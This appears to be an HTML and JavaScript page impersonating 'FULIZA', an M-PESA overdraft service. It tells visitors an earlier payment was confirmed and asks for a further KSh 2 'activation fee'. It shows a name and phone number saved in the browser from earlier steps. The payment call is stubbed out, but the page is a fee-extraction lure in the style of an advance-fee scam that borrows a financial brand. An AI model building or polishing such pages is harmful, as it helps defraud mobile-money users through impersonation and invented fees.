<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>FULIZA - Activation</title>

<style>

*{
    box-sizing:border-box;
}

body{
    margin:0;
    padding:16px 10px;
    font-family:Arial,sans-serif;
    background:#00A651;
    color:#FFFFFF;
}

.container{
    width:100%;
    max-width:430px;
    margin:0 auto;
}

.card{
    width:100%;
    background:
        linear-gradient(
            145deg,
            rgba(255,255,255,0.09),
            rgba(255,255,255,0.035)
        );

    padding:22px 18px 20px;
    border-radius:18px;

    box-shadow:
        0 20px 60px rgba(0,0,0,0.45),
        inset 0 1px 0 rgba(255,255,255,0.05);

    border:1px solid #000000;
}

.success{
    width:70px;
    height:70px;
    margin:0 auto 14px;

    display:flex;
    align-items:center;
    justify-content:center;

    background:#FFFFFF;
    color:#000000;

    border:2px solid #000000;
    border-radius:50%;

    font-size:38px;
    font-weight:800;
}

h1{
    text-align:center;
    background:#000000;
    color:#FFFFFF;

    font-size:26px;
    font-weight:800;

    margin:2px 0 16px;
    padding:10px;

    border:1px solid #FFFFFF;
    border-radius:10px;
}

p{
    text-align:center;
    font-size:14px;
    line-height:1.6;
    color:#FFFFFF;
}

.name{
    color:#FFFFFF;
    font-weight:800;
}

.amount{
    background:#000000;
    border:1px solid #FFFFFF;
    border-radius:12px;

    padding:16px 10px;
    margin:18px 0;

    text-align:center;

    color:#FFFFFF;

    font-size:28px;
    font-weight:800;
}

.info{
    margin-top:18px;

    background:#000000;

    border:1px solid #FFFFFF;
    border-radius:12px;

    padding:14px;
}

.row{
    display:flex;
    justify-content:space-between;
    align-items:center;

    gap:10px;
    padding:10px 0;

    border-bottom:1px solid
        rgba(255,255,255,0.25);
}

.row:last-child{
    border-bottom:none;
}

.label{
    font-size:13px;
    color:#FFFFFF;
}

.value{
    font-size:14px;
    font-weight:800;
    color:#FFFFFF;
    text-align:right;
    word-break:break-word;
}

.notice{
    margin-top:18px;

    padding:13px;

    background:rgba(255,255,255,0.10);

    border:1px solid #FFFFFF;
    border-radius:10px;

    color:#FFFFFF;

    font-size:13px;
    line-height:1.5;

    text-align:center;
}

button{
    width:100%;
    padding:15px;
    margin-top:18px;

    background:#000000;
    color:#FFFFFF;

    border:1px solid #FFFFFF;
    border-radius:11px;

    font-size:16px;
    font-weight:800;

    cursor:pointer;

    box-shadow:
        0 10px 30px rgba(0,0,0,0.30);
}

button:active{
    transform:scale(.98);
}

button:disabled{
    background:rgba(255,255,255,0.25);
    color:#FFFFFF;

    cursor:not-allowed;
    box-shadow:none;
}

#message{
    min-height:22px;
    margin-top:13px;

    color:#FFFFFF;

    font-size:13px;
    font-weight:600;

    line-height:1.5;
    text-align:center;
}

.footer{
    margin-top:15px;
    text-align:center;

    font-size:12px;
    color:#FFFFFF;
}

@media(max-width:360px){

    body{
        padding:10px 7px;
    }

    .card{
        padding:18px 13px 15px;
        border-radius:15px;
    }

    h1{
        font-size:23px;
    }

    button{
        padding:14px;
        font-size:15px;
    }

}

</style>

</head>

<body>

<div class="container">

<div class="card">

<div class="success">
    ✓
</div>

<h1>
    Complete Activation
</h1>

<p>
    Welcome,
    <span class="name" id="name">
        Applicant
    </span>
</p>

<p>
    Your previous payment has been
    successfully confirmed.
</p>

<div class="amount">
    Activation Fee: KSh 2
</div>

<p>
    To continue with activation, please review
    the activation fee and tap the button below.
</p>

<div class="info">

    <div class="row">

        <div class="label">
            M-PESA Number
        </div>

        <div class="value" id="phone">
            —
        </div>

    </div>

    <div class="row">

        <div class="label">
            Activation Fee
        </div>

        <div class="value">
            KSh 2
        </div>

    </div>

</div>

<div class="notice">

    Activation requires a KSh 2 activation fee.
    Please review the amount before continuing.

</div>

<button
    type="button"
    id="payBtn"
    onclick="startActivation()"
>
    Continue with Activation
</button>

<p id="message"></p>

<div class="footer">
    FULIZA
</div>

</div>

</div>


<script>

/* =====================================================
   FULIZA ACTIVATION
===================================================== */

const ACTIVATION_FEE = 2;


/* =====================================================
   SAVED CUSTOMER DATA
===================================================== */

const savedName =
    localStorage.getItem(
        "fulizaFullName"
    ) ||
    "Applicant";


const savedPhone =
    localStorage.getItem(
        "fulizaaPhoneNumber"
    ) ||
    localStorage.getItem(
        "phoneNumber"
    ) ||
    "";


/* =====================================================
   DISPLAY CUSTOMER DATA
===================================================== */

const firstName =
    savedName
        .trim()
        .split(/\s+/)[0] ||
        "Applicant";


document.getElementById(
    "name"
).textContent =
    firstName;


document.getElementById(
    "phone"
).textContent =
    savedPhone ||
    "Not available";


/* =====================================================
   ACTIVATION
===================================================== */

function startActivation(){

    const btn =
        document.getElementById(
            "payBtn"
        );

    const message =
        document.getElementById(
            "message"
        );


    /*
       This page intentionally does not initiate
       a live-money payment.

       Continue to your authorized payment flow
       using your payment provider's own
       implementation.
    */

    btn.disabled = true;

    btn.textContent =
        "Activation Processing...";


    message.textContent =
        "Activation request is being processed.";


    localStorage.setItem(
        "fulizaaActivationStarted",
        "true"
    );

}

</script>

</body>

</html>
